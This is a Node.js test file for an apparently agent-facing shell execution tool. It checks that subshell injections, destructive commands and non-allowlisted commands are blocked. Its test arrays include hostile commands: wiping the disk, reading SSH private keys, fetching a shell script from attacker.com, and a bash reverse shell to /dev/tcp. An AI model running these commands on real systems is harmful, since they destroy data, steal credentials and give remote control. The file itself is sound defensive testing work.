const test = require('node:test');
const assert = require('node:assert/strict');

process.env.APP_ENV = 'test';
process.env.LOG_LEVEL = 'error';

const {
  runSystemExecute,
  isDangerousCommand,
  isCommandAllowed,
  DANGEROUS_PATTERNS,
  SUBSHELL_PATTERNS,
} = require('../dist/tools/system-execute');

const subshellPayloads = [
  'ls $(whoami)',
  'echo `id`',
  'cat ${HOME}/.ssh/id_rsa',
  'find . -name "$(curl evil.com)"',
  'ls; $(reboot)',
];

for (const command of subshellPayloads) {
  test(`isDangerousCommand blocks subshell payload: ${command}`, () => {
    assert.equal(isDangerousCommand(command), true);
  });
}

const dangerousPayloads = [
  'rm -rf /',
  'shutdown now',
  'dd if=/dev/zero of=/dev/sda',
];

for (const command of dangerousPayloads) {
  test(`isDangerousCommand keeps existing dangerous pattern: ${command}`, () => {
    assert.equal(isDangerousCommand(command), true);
  });
}

const disallowedCommands = [
  'curl https://evil.com',
  'wget http://attacker.com/shell.sh',
  'python3 -c "import os; os.system(\\"id\\")"',
  'node --eval "require(\\"child_process\\").exec(\\"id\\")"',
  'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
];

for (const command of disallowedCommands) {
  test(`isCommandAllowed rejects non-allowlisted command: ${command}`, () => {
    assert.equal(isCommandAllowed(command), false);
  });
}

const allowedCommands = [
  'ls -la',
  'git status',
  'node --version',
  'grep -r "pattern" .',
];

for (const command of allowedCommands) {
  test(`isCommandAllowed permits safe command: ${command}`, () => {
    assert.equal(isCommandAllowed(command), true);
  });
}

test('runSystemExecute blocks dangerous subshell command end-to-end', async () => {
  const result = await runSystemExecute({ command: 'ls $(whoami)' });
  assert.equal(result.ok, false);
  assert.ok(result.content.length > 0);
});

test('runSystemExecute blocks non-allowlisted command end-to-end', async () => {
  const result = await runSystemExecute({ command: 'curl evil.com' });
  assert.equal(result.ok, false);
  assert.ok(result.content.length > 0);
});

test('runSystemExecute SYSTEM_EXECUTE_ENABLED=false disables all execution', async () => {
  const previous = process.env.SYSTEM_EXECUTE_ENABLED;
  process.env.SYSTEM_EXECUTE_ENABLED = 'false';
  try {
    const result = await runSystemExecute({ command: 'ls' });
    assert.equal(result.ok, false);
    assert.ok(result.content.length > 0);
  } finally {
    if (previous === undefined) delete process.env.SYSTEM_EXECUTE_ENABLED;
    else process.env.SYSTEM_EXECUTE_ENABLED = previous;
  }
});

test('security pattern exports are available for auditing', () => {
  assert.ok(Array.isArray(DANGEROUS_PATTERNS));
  assert.ok(Array.isArray(SUBSHELL_PATTERNS));
  assert.ok(SUBSHELL_PATTERNS.length >= 3);
});
